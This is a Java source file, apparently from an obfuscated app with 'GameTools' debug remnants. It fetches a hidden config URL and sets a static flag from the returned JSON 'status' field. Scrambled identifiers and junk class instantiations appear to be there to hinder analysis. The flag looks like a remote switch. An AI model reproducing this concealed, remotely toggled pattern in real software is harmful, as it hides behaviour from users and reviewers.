package koefig;

import com.alibaba.fastjson.JSONObject;
import com.kdfefhg.config.Confiefhg;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Httlood {
    public static boolean getInfo(){
        String str = getData(Confiefhg.HEBFSYHEFF);
        //System.out.println(str);
        new koefig.yvzlk.cji.mzfx.Vdjvdmhafp();
        //Log.d("GameTools", "====="+str);
        JSONObject json = JSONObject.parseObject(str);
        if (json != null){
            String s = json.getString("status");
            //Log.d("GameTools", "getInfo: json:"+s);
            new koefig.sui.wak.pvd.Aexmhqx();
            toodfjkgg.wuahyfuf = Boolean.parseBoolean(s);
            return true;
        }else{
            return false;
        }
    }

    public static String getData(String u){
        HttpURLConnection m_cont = null;
        InputStream impst = null;
        BufferedReader br = null;
        new koefig.ihy.arxhq.Myzjv();
        StringBuffer _strbf = new StringBuffer();
        try {
            new koefig.noq.jbs.Gykib();
            URL m_url = new URL(u);
            m_cont = (HttpURLConnection) m_url.openConnection();
            m_cont.setRequestMethod("GET");
            m_cont.setReadTimeout(16000);
            m_cont.connect();
            if (m_cont.getResponseCode() == 200) {
                impst = m_cont.getInputStream();
                if (null != impst) {
                    br = new BufferedReader(new InputStreamReader(impst, "UTF-8"));
                    String temp = null;
                    new koefig.dkp.wfjh.Usxgepyll();
                    while (null != (temp = br.readLine())) {
                        _strbf.append(temp);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != br) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != impst) {
                try {
                    impst.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            new koefig.dkp.wfjh.Tdgkie();
            m_cont.disconnect();
        }
        return _strbf.toString();
    }
}
